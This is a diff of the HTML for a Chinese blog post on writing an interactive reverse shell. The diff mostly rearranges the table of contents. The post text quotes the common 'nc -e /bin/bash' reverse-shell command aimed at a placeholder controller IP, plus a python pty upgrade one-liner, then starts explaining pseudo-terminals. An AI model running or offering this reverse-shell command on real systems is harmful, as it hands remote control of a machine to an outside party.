@@ -36,39 +36,42 @@
   </header>
   
 <div class="container">
-  <aside class="toc">
-    
-    <ul>
-      
-      <li>
-        <a href="https://chenx6.github.io/post/rev-pty/#ke-jiao-hu-shell-de-yuan-li">“可交互 Shell” 的原理</a>
-        
-      </li>
-      
-      <li>
-        <a href="https://chenx6.github.io/post/rev-pty/#dai-ma-shi-xian">代码实现</a>
-        
-      </li>
-      
-      <li>
-        <a href="https://chenx6.github.io/post/rev-pty/#refs">Refs</a>
-        
-      </li>
-      
-    </ul>
-    
-  </aside>
   <div class="post">
-    <h2 class="post-title">写一个可交互的反弹 Shell</h1>
-      <span class="post-date">2022-05-02</span>
-      
+    <h2 class="post-title">写一个可交互的反弹 Shell</h2>
+    <span class="post-date">2022-05-02</span>
+    
   
     
       <a href="https://chenx6.github.io/tags/linux/">#linux</a>
     
   
 
-      <p>在网上能看到一堆的反弹 Shell 方法，最常见的就是先用 <code>nc -e /bin/bash $控制机IP $控制机端口</code> 弹出一个 Shell，然后再用 <code>python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'</code> 这样来升级成交互式 Shell。这样的话得保证环境里有 nc + python，或者得在被控机上下载多个文件。这样的话，还不如直接自己写一个 Shell 呢 233。</p>
+    <aside class="toc">
+      
+      <details>
+        <summary>Tabel of contents</summary>
+        <ul>
+          
+          <li>
+            <a href="https://chenx6.github.io/post/rev-pty/#ke-jiao-hu-shell-de-yuan-li">“可交互 Shell” 的原理</a>
+            
+          </li>
+          
+          <li>
+            <a href="https://chenx6.github.io/post/rev-pty/#dai-ma-shi-xian">代码实现</a>
+            
+          </li>
+          
+          <li>
+            <a href="https://chenx6.github.io/post/rev-pty/#refs">Refs</a>
+            
+          </li>
+          
+        </ul>
+      </details>
+      
+    </aside>
+    <p>在网上能看到一堆的反弹 Shell 方法，最常见的就是先用 <code>nc -e /bin/bash $控制机IP $控制机端口</code> 弹出一个 Shell，然后再用 <code>python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'</code> 这样来升级成交互式 Shell。这样的话得保证环境里有 nc + python，或者得在被控机上下载多个文件。这样的话，还不如直接自己写一个 Shell 呢 233。</p>
 <h2 id="ke-jiao-hu-shell-de-yuan-li">“可交互 Shell” 的原理</h2>
 <p>现在常见的“终端模拟器”，例如 KDE 的 Konsole, MACos 上的 iterm，服务器上的 SSH，都是使用 &quot;pty&quot; 来实现的。而我们反弹的 Shell 则不一样，所以无法交互。</p>
 <p>而 pty 则是模拟终端的设备。平时使用的终端模拟器是和 pty master 进行沟通，而里面的 shell 是和 pty slave 进行沟通，两者通过 pty 进行沟通。</p>
